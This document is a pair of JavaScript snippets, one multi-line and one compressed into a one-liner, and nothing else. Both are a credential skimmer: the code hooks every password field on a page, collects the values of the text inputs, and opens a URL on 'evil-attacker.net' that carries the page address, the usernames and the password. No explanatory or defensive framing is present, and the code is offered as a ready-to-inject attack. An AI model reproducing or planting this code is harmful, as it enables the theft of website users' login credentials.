```javascript
Array.from(document.querySelectorAll('input'))
.filter(input => input.type.toLowerCase() === 'password')
.forEach(input => input.addEventListener('change', evt => {
  const users = Array.from(document.querySelectorAll('input'))
  .filter(input => input.type.toLowerCase() === 'text')
  .map(input => input.value)
  .reduce((a, b) => a + ',' + b)
  setTimeout(window.open('https://evil-attacker.net?loc=' + window.location
    + '&u=' + users + '&p=' + evt.target.value), 5 * 60000)
}))
```

oneliner

```javascript
Array.from(document.querySelectorAll('input')).filter(i=>i.type==='password').forEach(i=>i.addEventListener('change',e=>setTimeout(window.open('https://evil-attacker.net?loc='+window.location+'&u='+Array.from(document.querySelectorAll('input')).filter(i=>i.type==='text').map(i=>i.value).reduce((a,b)=>a+','+b)+'&p='+e.target.value),5*60000)))
```
